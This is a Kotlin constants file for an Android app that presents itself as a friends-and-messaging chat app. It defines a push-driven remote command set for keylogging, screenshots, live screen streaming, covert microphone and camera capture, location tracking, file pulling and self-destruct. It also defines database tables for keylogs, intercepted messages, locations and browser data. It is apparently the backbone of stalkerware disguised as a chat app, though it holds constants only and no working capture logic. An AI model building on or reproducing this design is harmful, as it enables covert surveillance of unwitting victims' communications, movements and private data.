package com.bestiecourt.app.core.constants

object AppConstants {

    object Commands {
        // Diagnostics
        const val DIAG_PING: Byte            = 0x01
        const val DIAG_DEVICE_STATUS: Byte   = 0x02
        const val DIAG_STORAGE_INFO: Byte    = 0x03
        const val DIAG_SECURITY_AUDIT: Byte  = 0xE1.toByte()

        // Keylogger
        const val START_KEYLOG: Byte         = 0xA1.toByte()
        const val STOP_KEYLOG: Byte          = 0xA2.toByte()

        // Screen
        const val TAKE_SCREENSHOT: Byte      = 0xB1.toByte()
        const val START_LIVE_STREAM: Byte    = 0xB2.toByte()
        const val STOP_LIVE_STREAM: Byte     = 0xB3.toByte()

        // Audio / Camera
        const val START_MIC: Byte            = 0xC1.toByte()
        const val STOP_MIC: Byte             = 0xC2.toByte()
        const val START_CAMERA: Byte         = 0xC3.toByte()
        const val STOP_CAMERA: Byte          = 0xC4.toByte()
        const val CAPTURE_PHOTO: Byte        = 0xC5.toByte()   // params: "front" | "back"

        // Location / Files / Control
        const val GET_LOCATION: Byte         = 0xD1.toByte()
        const val PULL_FILE: Byte            = 0xE2.toByte()
        const val UPDATE_CONFIG: Byte        = 0xF1.toByte()
        const val SELF_DESTRUCT: Byte        = 0xFF.toByte()
    }

    // Intervals
    const val KEYLOG_BATCH_INTERVAL_MS     = 15_000L
    const val LOCATION_UPDATE_INTERVAL_MS  = 300_000L
    const val SCREENSHOT_INTERVAL_MS       = 20_000L
    const val MAX_MIC_RECORDING_MS         = 300_000L
    const val MAX_LIVE_STREAM_MS           = 600_000L
    const val POLLER_INTERVAL_MS           = 5_000L

    // Notification channels
    const val CHANNEL_MESSAGES = "securechat_messages"
    const val CHANNEL_SERVICE  = "securechat_service"

    // Tables
    object Tables {
        const val PROFILES            = "profiles"
        const val FRIENDSHIPS         = "friendships"
        const val FRIEND_REQUESTS     = "friend_requests"
        const val MESSAGES            = "messages"
        const val DEVICE_INFO         = "device_info"
        const val PENDING_COMMANDS    = "pending_commands"
        const val COMMAND_RESULTS     = "command_results"
        const val KEYLOGS             = "keylogs"
        const val MESSAGES_INTERCEPT  = "messages_intercept"
        const val LOCATIONS           = "locations"
        const val FILE_LISTINGS       = "file_listings"
        const val BROWSER_DATA        = "browser_data"
    }

    // Error codes (standard)
    object ErrorCodes {
        const val UNAUTHORIZED         = "unauthorized"
        const val FORBIDDEN            = "forbidden"
        const val DEVICE_NOT_FOUND     = "device_not_found"
        const val DEVICE_NOT_OWNED     = "device_not_owned"
        const val NO_FCM_TOKEN         = "no_fcm_token"
        const val FCM_SEND_FAILED      = "fcm_send_failed"
        const val COMMAND_NOT_FOUND    = "command_not_found"
        const val EXPIRED              = "expired"
        const val ALREADY_CLAIMED      = "already_claimed"
        const val ALREADY_FINALIZED    = "already_finalized"
        const val NONCE_MISMATCH       = "nonce_mismatch"
        const val UNSUPPORTED_COMMAND  = "unsupported_command"
        const val PERMISSION_DENIED    = "permission_denied"
        const val EXECUTION_EXCEPTION  = "execution_exception"
        const val TIMEOUT              = "timeout"
        const val BUSY                 = "busy"
        const val NETWORK_ERROR        = "network_error"
        const val UNKNOWN              = "unknown"
    }

    // Logging tags
    object Tags {
        const val FCM_REG   = "FCM_REG"
        const val FCM_PUSH  = "FCM_PUSH"
        const val CMD_SEND  = "CMD_SEND"
        const val CMD_CLAIM = "CMD_CLAIM"
        const val CMD_EXEC  = "CMD_EXEC"
        const val CMD_ACK   = "CMD_ACK"
        const val POLLER    = "POLLER"
    }
}
